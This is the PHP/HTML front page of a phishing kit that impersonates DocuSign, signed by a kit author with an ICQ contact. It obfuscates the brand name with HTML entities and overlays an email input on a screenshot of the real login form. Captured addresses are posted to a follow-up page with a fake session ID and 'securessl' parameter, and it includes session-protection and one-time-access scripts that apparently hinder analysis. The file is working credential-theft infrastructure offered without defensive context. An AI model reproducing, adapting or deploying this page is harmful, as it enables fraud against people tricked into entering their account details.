<?php
/*
Created by legzydaboss -- icq 692561824
*/
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<title page-title>D&#111;c&#117;Sign</title>
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
<style> 
 
 .inputs {
    padding: 8px;
    border-radius: 2px;
    border: 1px solid  #2874a6 ;
    background-image: none;
    width: 270px;
	height: 32px;
	font-size: 12px;
	
}

.inputs:focus {
    outline-color: #54B4AD;
}
</style> 
 
<script>
function validateForm()
{
var y=document.forms["myform"]["email"].value;
if(y==null || y=="")
  {
  alert("Please provide your E`mail address");
  return false;
  }
}
</script>

<body style="visibility:hidden" onload="unhideBody()">

 

</head>
<body bgColor="#FFFFFF">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:100%; height:100%; z-index:0"><img src="images/form.png" alt="" title="" border=0 width=100% height=100%></div>
<div style="position:absolute;top:33.5%;left:37.5%;z-index:1;width:24.5%;height:7%;">
<form name="myform" id="myform" method="post" autocomplete="off" onsubmit="return validateForm()" action="index2.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true">
<input name="email" id="email" type="email" Placeholder="Email address" type="text" style="width:98.5%;height:60%;background: #F5FBEF;z-index:6" class="inputs">
<div id="formimage1" style="position:absolute;z-index:9;top:100%;left:-2px;height:70%;width:100%;"><input type="image" name="formimage1" width="100%" height="100%" src="images/cont.png"></div></div>
<a href="doosign2/"><div id="image1" style="position:absolute; overflow:hidden;left:37.5%;width:24.5%; height:6%;top:62%; z-index:0"><img src="images/others.png" alt="" title="" border=0 width=100% height=100%></div>

</body>
</html>